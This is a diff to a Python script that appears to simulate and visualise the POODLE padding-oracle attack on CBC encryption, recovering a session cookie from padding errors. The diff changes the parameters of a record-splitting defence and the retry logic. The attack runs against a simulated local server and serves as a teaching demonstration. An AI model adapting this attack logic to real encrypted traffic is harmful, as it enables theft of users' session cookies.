@@ -45,12 +45,11 @@ middleWin = ''
 bottomWin = ''
 height = 0
 width = 0
-NUM_SOUNDS = 47
+NUM_SOUNDS = 41
 DELAY_STEP = 15000
 
 
 def encryptMessage(message):
-
   #print '\n*** ENCRYPT ***'
   # block-sized IV randomized for each simulated HTTPS request; needs to vary for every request!!  
   IV = Random.get_random_bytes(AES_CBC_BLOCK_SIZE)
@@ -58,12 +57,12 @@ def encryptMessage(message):
   C0 = IV
   C1toCn = cipher.encrypt(message)
   encryptMessage = C0 + C1toCn
-
   return encryptMessage
 
 
+
 # macLength should always be 20 bytes
-# return: 1 on successful decrypt
+# return: 1 on successful decrypt (correct padding and correct MAC)
 # return: -1 on padding error
 # return: -2 on MAC error
 def decryptMessage(encryptMessage):
@@ -149,7 +148,6 @@ def victimCraftHTTPSRequestInit(path, pathFillBytes, body, bodyFillBytes):
   messageAndMac = message + macTag
   messagePadded = addPadding(messageAndMac)
   messageEncrypted = encryptMessage(messagePadded)
-
   return messageEncrypted
 
 
@@ -163,7 +161,6 @@ def victimCraftHTTPSRequest(message):
   messageAndMac = message + macTag
   messagePadded = addPadding(messageAndMac)
   messageEncrypted = encryptMessage(messagePadded)
-
   return messageEncrypted
 
 
@@ -172,17 +169,14 @@ def poodleAttack(clientServerSocket):
   global plaintextCookie
   #1. Attacker crafts HTTP message with JavaScript injection that victim will send as HTTPS reqeust
   # add initial fill bytes to end of POST path and end of body
-
   path = 'POST /https_page'
   pathFillBytes = 'PPPP'  
   body = '_body_'
   bodyFillBytes = 'B'  
   decryptText = ''
-
   # randomize list of numbers for sound files
   soundList = range(0, NUM_SOUNDS)
   random.shuffle(soundList)
-
   #2. Attacker sends modified message path, body to victim server to craft message with cookie into HTTPS request;
   #   attacker intercepts encrypted message from victim enroute to HTTPS server
   messageEncrypted = victimCraftHTTPSRequestInit(path, pathFillBytes, body, bodyFillBytes)
@@ -222,35 +216,42 @@ def poodleAttack(clientServerSocket):
   attempts = 0
   #4. start with Ci and position and overwrite end padding block
   for k in range(0, numBytesToDecrypt):
+    i = 3
     wasSplit = False
     while (serverResponse != 1):
-      if screen.getch() == ord('q'):
-        closeScreen()
-        clientServerSocket.close()
-        sys.exit()
+      i = 3
+      wasSplit = False
       numRecs = 1
       printPlainMessage(path, pathFillBytes, body, bodyFillBytes, i, k)
       messageOrig = path + pathFillBytes + plaintextCookie + body + bodyFillBytes
       if recordSplit:
         # check if plain message from attacker plus MAC length is even block size; if so, need to split record
-        if (len(messageOrig) + macLength) % AES_CBC_BLOCK_SIZE == 0 and len(messageOrig) > 8:
-          # perform 8 / N-1 record split, creating two messages
+        if (len(messageOrig) + macLength) % AES_CBC_BLOCK_SIZE == 0 and len(messageOrig) > 6:
+          # perform 6 / N-1 record split, creating two messages
           wasSplit = True
           numRecs = 2
-          mess1 = messageOrig[:8]
-          mess2 = messageOrig[8:]
+          mess1 = messageOrig[:6]
+          mess2 = messageOrig[6:]
           printSplitRecord(mess1, 1)
           printSplitRecord(mess2, 2)
-
+      numSplitAttempts = 0          
       while numRecs > 0:
         # intercept encrypted message request from victim browser enroute to HTTPS server
         if wasSplit:
           if numRecs == 2:
-            messageOrig = mess1
+            messageOrig = mess2   # try to decrypt byte from second (longer message) first
+            if len(messageOrig) >= 48:  # don't try to decrypt data in a block shared with the MAC if a short message
+              i = 3
+            else:
+              i = 1
           else:
-            messageOrig = mess2
+            printPlainMessage(path, pathFillBytes, body, bodyFillBytes, i, k)
+            printSplitRecord(mess1, 1)
+            printSplitRecord(mess2, 2)                    
+            messageOrig = mess1
+            i = 1     # only the first block after IV contains data in the first (short) message            
         messageEncrypted = victimCraftHTTPSRequest(messageOrig)
-        printDecryption(messageEncrypted, decryptText, numBytesToDecrypt)
+        printDecryption(messageEncrypted, decryptText, numBytesToDecrypt)        
         # move the Ci block to the end of the record, replacing the full padding block
         CiBlock = messageEncrypted[i * AES_CBC_BLOCK_SIZE : (i*AES_CBC_BLOCK_SIZE) + AES_CBC_BLOCK_SIZE]
         messageEncrypted = messageEncrypted[:len(messageEncrypted) - AES_CBC_BLOCK_SIZE]
@@ -274,8 +275,15 @@ def poodleAttack(clientServerSocket):
           attempts += 1
           middleWin.addstr(0, 20, 'Attempts: ' + str(attempts) + '    ')
           middleWin.refresh()
-        numRecs -= 1
-  
+          if serverResponse == 1:
+            numRecs -= 1
+        if recordSplit:
+          numSplitAttempts += 1
+          if numSplitAttempts > 500:  # stop trying to decipher a split record after N attempts
+            numSplitAttempts = 0
+            numRecs -= 1
+            if numRecs == 0:
+              bodyFillBytes = bodyFillBytes + 'BBBB'
     start = (i * AES_CBC_BLOCK_SIZE) - 1                          # index of last byte in Ci-1
     CiMinusOneByte = messageEncrypted[start:start+1]              # last byte of Ci-1
     start = ((numBlocks - 1) * AES_CBC_BLOCK_SIZE) - 1            # index of last byte in Cn-1
@@ -321,8 +329,8 @@ def poodleAttack(clientServerSocket):
   screen.nodelay(1)
 
 
-def printPlainMessage(path, pathFillBytes, body, bodyFillBytes, i, k):
 
+def printPlainMessage(path, pathFillBytes, body, bodyFillBytes, i, k):
   startInd = i * AES_CBC_BLOCK_SIZE - 1
   if startInd < 0:
     startInd = 0
@@ -346,15 +354,15 @@ def printPlainMessage(path, pathFillBytes, body, bodyFillBytes, i, k):
   topWin.addstr(5, 34, blockMinusOne, curses.color_pair(18))
   topWin.addstr(5, 50, blockMinusOne, curses.color_pair(14))
   topWin.addstr(5, 66, blockMinusOne, curses.color_pair(14))
-  topWin.addstr(5, 82, blockMinusOne, curses.color_pair(18))  
+  topWin.addstr(5, 82, blockMinusOne, curses.color_pair(18))
+
+  topWin.clrtobot()
 
   topWin.refresh()
 
 
 
 def printSplitRecord(message, messInd):
-
-
   mac = '|----20-BYTE MAC---|'
   # add MAC and padding
   message = message + mac
@@ -364,10 +372,8 @@ def printSplitRecord(message, messInd):
     pad = 'X' + pad
   message = message + pad
   topWin.addstr(5 + 3*messInd, 1, message)
-
   blockMinusOne = '               '
   block =         '                '
-
   numBlocks = len(message) / AES_CBC_BLOCK_SIZE
   for i in range(0,numBlocks):
     if i == 0:
@@ -414,27 +420,6 @@ def startServer(ip, port):
   bottomWin.addstr('Server listening for connection...\n')
   bottomWin.refresh()
   while True:
-    if screen.getch() == ord('q'):
-      closeScreen()
-      serverClientSocket.close()
-      sys.exit()
-    if screen.getch() == ord('q'):
-      closeScreen()
-      serverClientSocket.close()
-      sys.exit()
-    if screen.getch() == ord('w'):
-      delay += DELAY_STEP
-      topWin.erase()
-      topWin.addstr(0, 0, "ORACLE HTTPS SERVER")                
-      topWin.addstr(1,width-3,str(delay/DELAY_STEP), curses.color_pair(8))
-      topWin.refresh()
-    if screen.getch() == ord('s'):
-      if delay >= DELAY_STEP:
-        delay -= DELAY_STEP
-        topWin.erase()
-        topWin.addstr(0, 0, "ORACLE HTTPS SERVER")                      
-        topWin.addstr(1,width-3,str(delay/DELAY_STEP), curses.color_pair(8))
-        topWin.refresh()
     serverClientSocket, addr = serverListen.accept()
     bottomWin.addstr('Client connected IP: ' + addr[0] + '  Port: ' + str(addr[1]) + '\n')
     bottomWin.refresh()
@@ -684,7 +669,7 @@ if __name__ == '__main__':
     plaintextCookie = 'Cookie: ' + sys.argv[4]
     if sys.argv[5].lower() == 'true':
       recordSplit = True
-      print 'Using 8 / (n-8) record splitting defense'
+      print 'Using 6 / (n-6) record splitting defense'
     wrapper(setScreenClient, ip, port)  
   else:
     print 'poodle_attack.py -server <IP> <port> <delay>'
